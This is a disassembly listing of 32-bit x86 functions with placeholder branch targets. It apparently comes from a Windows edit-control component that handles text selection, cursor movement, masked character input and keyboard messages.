mov eax ebx
call sub_470e5c
mov eax [ esp ]
mov [ ebx + 0x230 ] eax
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov eax ebx
call sub_471114
movsx eax [ esi + 0x8 ]
cmp eax [ ebx + 0x234 ]
jle r-xdata
mov eax [ esp + 0x4 ]
mov [ ebx + 0x230 ] eax
sub_470904
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_470960
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_47096c
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_40434c
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470967
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
mov eax esi
call sub_404400
mov edx eax
mov eax ebx
call sub_43fb8c
mov eax ebx
call sub_471114
sub_470980
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4709c0
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4709d0
mov eax [ ebp - 0x4 ]
call sub_404200
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4709c7
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_4709d0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_470a54
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_470c84
test al al
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_47096c
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax ebx
call sub_471a94
cmp [ ebx + 0x22c ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43fbb0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470a5b
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f64
retn
lea eax [ ebp - 0x8 ]
push eax
mov edx [ esi ]
xor ecx ecx
mov eax ebx
call sub_471a4c
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_403f94
sub_470a64
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_470b5a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_470c84
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_403fd8
cmp [ ebx + 0x22c ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43fbe0
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov cl 0x1
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_471a4c
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
call sub_403fd8
lea eax [ ebp - 0xc ]
push eax
mov cl [ ebx + 0x224 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x220 ]
call sub_470258
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
call sub_403fd8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470b61
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f64
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_470904
test [ ebx + 0x1c ] 0x10
je r-xdata
test [ ebx + 0x22d ] 0x4
jne r-xdata
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xf0 ]
test al al
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba88
call sub_4038f8
sub_470b68
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_470c84
test al al
jne r-xdata
mov eax ebx
call sub_4362f8
mov dx 0x2e
mov eax ebx
call sub_4716c8
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_470b9c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_470c76
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_470c84
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
cmp [ ebx + 0x20e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470c7d
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f64
retn
call sub_42fcf8
mov edx [ eax ]
call [ edx + 0x18 ]
call sub_42fcf8
lea edx [ ebp - 0x4 ]
call sub_42f940
call sub_42fcf8
mov edx [ eax ]
call [ edx + 0x14 ]
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_470e5c
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_47096c
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
call sub_472180
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_470904
mov eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_472218
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_470904
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_470ea4
sub_470c94
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_470d49
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_47096c
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_471a94
lea eax [ ebx + 0x220 ]
mov edx esi
call sub_403f94
mov eax esi
call sub_404200
mov edx eax
mov eax [ ebx + 0x220 ]
call sub_46ffe8
mov [ ebx + 0x228 ] eax
mov eax esi
call sub_46fe6c
mov [ ebx + 0x22c ] al
mov eax esi
call sub_46fef0
mov [ ebx + 0x224 ] al
lea eax [ ebp - 0xc ]
push eax
mov cl 0x1
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_471a4c
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
call sub_403fd8
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_470904
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470d50
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_403f64
retn
sub_470d58
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x220 ]
call sub_40434c
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_446754
test al al
je r-xdata
test esi esi
je r-xdata
mov edx esi
mov eax ebx
call sub_470c94
and [ ebx + 0x22d ] 0xfe
cmp [ ebx + 0x220 ] 0x0
je r-xdata
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax ebx
call sub_470e5c
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax ebx
call sub_436114
mov eax ebx
call sub_470c84
test al al
je r-xdata
or [ ebx + 0x22d ] 0x1
xor edx edx
mov eax ebx
call sub_470904
mov eax ebx
call sub_446754
test al al
je r-xdata
cmp [ ebx + 0x228 ] 0x0
jle r-xdata
mov eax ebx
call sub_446450
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_436114
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx [ esp ]
mov eax ebx
call sub_470ea4
sub_470e2c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_470c84
test al al
jne r-xdata
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_436114
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_436114
pop esi
pop ebx
retn
sub_470e5c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0xb0
mov eax ebx
call sub_446450
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_470e80
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0xb1
mov eax ebx
call sub_446450
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_470ea4
push ebp
mov ebp esp
add esp 0xfffffde4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x21c ] ecx
mov [ ebp - 0x218 ] ecx
mov [ ebp - 0x214 ] ecx
mov [ ebp - 0x210 ] ecx
mov [ ebp - 0x20c ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_471104
push [ fs : eax ]
mov [ fs : eax ] esp
cmp ebx 0x1
jl r-xdata
mov [ ebp - 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_470c84
test al al
je r-xdata
lea edx [ ebp - 0x20c ]
mov eax [ ebp - 0x4 ]
call sub_47096c
mov eax [ ebp - 0x20c ]
mov edx ebx
call sub_40c380
cmp al 0x1
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
dec ebx
lea edx [ ebp - 0x218 ]
mov eax [ ebp - 0x4 ]
call sub_47096c
mov eax [ ebp - 0x218 ]
call sub_404200
cmp eax [ ebp - 0x8 ]
jg r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
inc ebx
lea edx [ ebp - 0x210 ]
mov eax [ ebp - 0x4 ]
call sub_47096c
mov eax [ ebp - 0x210 ]
call sub_404200
cmp ebx eax
jge r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_470e80
lea edx [ ebp - 0x21c ]
mov eax [ ebp - 0x4 ]
call sub_47096c
mov eax [ ebp - 0x21c ]
call sub_404200
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
lea edx [ ebp - 0x214 ]
mov eax [ ebp - 0x4 ]
call sub_47096c
mov eax [ ebp - 0x214 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov ecx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_470e80
cmp ebx [ ebp - 0x8 ]
je r-xdata
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
inc ebx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x230 ] edx
jmp r-xdata
lea eax [ ebp - 0x108 ]
push eax
call GetKeyboardState
mov edx 0x100
lea eax [ ebp - 0x208 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47110b
lea eax [ ebp - 0x21c ]
mov edx 0x5
call sub_403f64
retn
mov [ eax ] 0x0
inc eax
dec edx
jne r-xdata
mov [ ebp - 0x1f8 ] 0x81
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_403368
and eax 0x7f
movzx eax [ eax * 2 + rw-data ]
mov [ ebp + eax - 0x208 ] 0x81
lea eax [ ebp - 0x208 ]
push eax
call SetKeyboardState
mov eax [ ebp - 0x4 ]
mov [ eax + 0x23c ] 0x1
xor eax eax
push ebp
push sub_471072
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_403368
and eax 0x7f
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x100
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call SendMessageA
push 0x1
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_403368
and eax 0x7f
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x101
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call SendMessageA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x23c ] 0x0
retn
sub_471114
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_446754
test al al
je r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_470c84
test al al
je r-xdata
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax ebx
call sub_470e5c
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx [ esp ]
mov eax ebx
call sub_470ea4
sub_471160
push ebx
mov ebx eax
mov eax ebx
call sub_436158
test al al
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x238 ]
mov eax ebx
call sub_470904
xor edx edx
mov eax ebx
call sub_436190
sub_471188
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_47134d
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
xor eax eax
mov al [ ebx ]
cmp ax 0x1b
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xec ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471354
lea eax [ ebp - 0x10 ]
call sub_403f40
retn
cmp [ esi + 0x20e ] 0x0
jne r-xdata
xor eax eax
mov al [ ebx ]
cmp ax 0x8
je r-xdata
cmp ax 0xd
jne r-xdata
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_470e5c
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x8 ]
dec eax
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xf8 ]
jmp r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov dx 0x2e
mov eax esi
call sub_4716c8
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_47159c
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_470ea4
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_471c68
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push 0x1
push 0x102
push 0x102
mov eax esi
call sub_446450
push eax
lea eax [ ebp - 0x2c ]
push eax
call PeekMessageA
test eax eax
je r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
cmp [ ebp - 0x28 ] 0x12
jne r-xdata
lea eax [ ebp - 0x10 ]
mov dl [ ebx ]
call sub_404128
lea eax [ ebp - 0x30 ]
mov dl [ ebx ]
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x30 ]
lea eax [ ebp - 0x34 ]
call sub_402a64
lea eax [ ebp - 0x38 ]
mov dl [ ebp - 0x24 ]
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x38 ]
lea eax [ ebp - 0x34 ]
mov cl 0x2
call sub_402a34
lea edx [ ebp - 0x34 ]
lea eax [ ebp - 0x10 ]
call sub_4041a4
mov ecx [ ebp - 0x8 ]
add ecx 0x2
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_470e80
jmp r-xdata
mov eax [ ebp - 0x24 ]
push eax
call PostQuitMessage
mov eax [ ebp - 0x10 ]
call sub_404400
push eax
push 0x0
push 0xc2
mov eax esi
call sub_446450
push eax
call SendMessageA
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_470e5c
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_471548
sub_471360
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47153a
push [ fs : eax ]
mov [ fs : eax ] esp
test [ ebp - 0x1 ] 0x4
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471541
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403f64
retn
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_470e5c
test [ ebp - 0x1 ] 0x1
je r-xdata
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x8 ]
dec eax
jle r-xdata
cmp si 0x27
jne r-xdata
cmp si 0x25
jne r-xdata
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x8 ]
cmp eax 0x2
jne r-xdata
dec [ ebx + 0x230 ]
mov eax [ ebp - 0x8 ]
add eax 0x2
cmp eax [ ebp - 0xc ]
jne r-xdata
inc [ ebx + 0x230 ]
mov eax [ ebp - 0x8 ]
inc eax
cmp eax [ ebp - 0xc ]
jne r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_471580
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebx + 0x230 ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_47096c
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov al [ eax + edx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
cmp [ ebx + 0x230 ] 0x0
jge r-xdata
mov eax [ ebx + 0x230 ]
cmp eax [ ebp - 0x8 ]
jle r-xdata
mov eax [ ebx + 0x228 ]
cmp eax [ ebx + 0x230 ]
jge r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_470e80
inc [ ebx + 0x230 ]
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_47096c
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov al [ eax + edx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_470ea4
jmp r-xdata
mov edx [ ebx + 0x230 ]
mov eax ebx
call sub_470ea4
jmp r-xdata
dec [ ebx + 0x230 ]
cmp si 0x25
jne r-xdata
xor eax eax
mov [ ebx + 0x230 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
inc eax
mov ecx eax
mov edx eax
mov eax ebx
call sub_470e80
dec [ ebx + 0x230 ]
mov [ ebx + 0x230 ] eax
jmp r-xdata
mov ecx 0x1
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_471548
mov ecx 0x2
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_471548
jmp r-xdata
mov ecx 0x2
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_471548
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_471580
jmp r-xdata
sub_471548
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea ebx [ ecx + edi ]
mov edx ebx
mov eax esi
call sub_47159c
mov ebx eax
mov edx ebx
mov eax [ esi + 0x220 ]
call sub_470098
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_470ea4
pop edi
pop esi
pop ebx
retn
mov ebx edi
sub_47159c
push ebx
push esi
mov esi eax
mov ebx edx
jmp r-xdata
cmp ebx [ esi + 0x228 ]
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x220 ]
call sub_470098
test al al
jne r-xdata
inc ebx
sub_4715c4
push ebx
push esi
mov esi eax
mov ebx edx
jmp r-xdata
test ebx ebx
jl r-xdata
test ebx ebx
jge r-xdata
mov edx ebx
mov eax [ esi + 0x220 ]
call sub_470098
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_47159c
mov ebx eax
dec ebx
sub_4715f8
push ebx
push esi
add esp 0xfffffff4
mov [ esp ] cl
mov esi edx
mov ebx eax
lea ecx [ esp + 0x8 ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_470e5c
cmp si 0x24
jne r-xdata
test [ esp ] 0x1
je r-xdata
test [ esp ] 0x1
je r-xdata
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_470ea4
mov eax [ esp + 0x8 ]
cmp eax [ ebx + 0x230 ]
je r-xdata
xor edx edx
mov eax ebx
call sub_470ea4
mov eax [ esp + 0x4 ]
cmp eax [ ebx + 0x230 ]
je r-xdata
mov ecx [ ebx + 0x228 ]
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_470e80
mov eax ebx
call sub_471114
jmp r-xdata
mov eax [ esp + 0x4 ]
inc eax
cmp eax [ esp + 0x8 ]
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov ecx [ esp + 0x8 ]
xor edx edx
mov eax ebx
call sub_470e80
mov eax ebx
call sub_471114
jmp r-xdata
mov eax [ esp + 0x4 ]
inc eax
cmp eax [ esp + 0x8 ]
je r-xdata
mov eax [ ebx + 0x228 ]
mov [ ebx + 0x230 ] eax
mov eax [ esp + 0x8 ]
dec eax
mov [ esp + 0x4 ] eax
xor eax eax
mov [ ebx + 0x230 ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
inc eax
mov [ esp + 0x8 ] eax
sub_4716c8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
lea edi [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_4717d4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x20e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4717db
lea eax [ ebp - 0xc ]
call sub_403f40
retn
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_470e5c
mov eax [ ebp - 0x8 ]
sub eax [ edi ]
dec eax
jg r-xdata
mov eax [ ebp - 0x8 ]
sub eax [ edi ]
dec eax
jl r-xdata
cmp si 0x8
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_47096c
mov eax [ ebp - 0x8 ]
sub eax [ edi ]
push eax
lea edx [ ebp - 0xc ]
mov ecx [ edi ]
mov eax ebx
call sub_472180
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
sub ecx [ edi ]
mov edx [ edi ]
inc edx
mov eax [ ebp - 0xc ]
call sub_404460
mov eax [ ebp - 0xc ]
call sub_404400
push eax
push 0x0
push 0xc2
mov eax ebx
call sub_446450
push eax
call SendMessageA
mov eax [ ebp - 0x8 ]
sub eax [ edi ]
dec eax
je r-xdata
mov esi [ edi ]
mov edx [ edi ]
mov eax ebx
call sub_471580
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_470e5c
cmp esi [ edi ]
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_470e5c
mov edx [ edi ]
dec edx
mov eax ebx
call sub_470ea4
mov edx [ edi ]
mov eax ebx
call sub_47159c
mov [ edi ] eax
mov edx [ edi ]
mov eax ebx
call sub_470ea4
jmp r-xdata
sub_4717e4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_471867
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_470c84
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_436850
test [ ebx + 0x1c ] 0x10
jne r-xdata
test [ ebx + 0x22d ] 0x2
jne r-xdata
and [ ebx + 0x22d ] 0xfd
mov eax ebx
call sub_471114
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_47096c
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x238 ]
call sub_403f94
mov edx esi
mov eax ebx
call sub_436850
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47186e
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_471874
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_4718f5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_43688c
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_47096c
mov edx [ ebp - 0xc ]
lea eax [ ebx + 0x238 ]
call sub_403f94
mov eax ebx
call sub_446754
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4718fc
lea eax [ ebp - 0xc ]
call sub_403f40
retn
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_470e5c
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_47159c
cmp eax [ ebp - 0x4 ]
je r-xdata
mov edx eax
mov eax ebx
call sub_470ea4
sub_471904
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x4 ] 0x1b
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_470c84
test al al
je r-xdata
mov eax ebx
call sub_436158
test al al
je r-xdata
mov [ esi + 0xc ] 0x1
sub_47193c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_470c84
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_445878
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf8 ]
mov eax ebx
call sub_471114
sub_471970
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_471a02
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_47096c
mov eax esi
call sub_470c84
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471a09
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
mov eax esi
call sub_436158
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf0 ]
test al al
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_470ea4
mov eax esi
mov edx [ eax ]
call [ edx + 0xf4 ]
or [ esi + 0x22d ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_471a10
push ebx
add esp 0xfffffff8
mov ebx eax
push 0x0
call MessageBeep
mov eax [ ebx + 0x220 ]
mov [ esp ] eax
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac4
call sub_4038f8
pop ecx
pop edx
pop ebx
retn
sub_471a4c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push edi
mov cl [ ebx + 0x224 ]
mov edx esi
mov eax [ ebx + 0x220 ]
call sub_46fc50
push edi
mov cl 0x20
mov edx esi
mov eax [ ebx + 0x220 ]
call sub_46fc50
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_471a94
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x18 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_471c5a
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x1
mov eax esi
mov edx ebx
call sub_403f94
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
call sub_404200
mov ebx eax
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx 0x1
call sub_46fbb4
mov ebx eax
test bl 0x1
je r-xdata
mov edi 0x1
mov eax [ esi ]
call sub_404200
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
test ebx ebx
jle r-xdata
mov [ ebp - 0xc ] 0x1
mov eax [ esi ]
call sub_404200
mov ebx eax
test ebx ebx
jle r-xdata
mov al [ ebp - 0xd ]
add al 0xfc
sub al 0x2
jae r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov eax [ esi ]
call sub_404200
mov ecx eax
sub ecx [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
inc edx
mov eax [ esi ]
call sub_404460
mov eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0xc ]
dec ecx
mov eax [ esi ]
mov edx 0x1
